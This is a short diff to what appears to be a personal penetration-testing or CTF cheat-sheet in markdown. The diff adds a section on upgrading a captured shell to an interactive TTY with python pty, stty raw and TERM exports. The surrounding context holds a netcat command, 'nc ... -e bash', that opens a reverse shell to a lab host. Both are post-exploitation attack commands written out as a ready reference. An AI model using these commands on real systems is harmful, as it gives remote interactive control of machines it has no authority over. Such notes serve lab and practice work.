@@ -1,3 +1,15 @@
+# Shell ✅
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+CTRL + Z
+stty raw -echo;fg
+reset
+xterm‌‌
+
+export TERM=xterm‌‌
+export SHELL=bash
+```
 # Reverse_Shell ✅
 ```bash
 nc 10.11.99.141 5555 -e bash
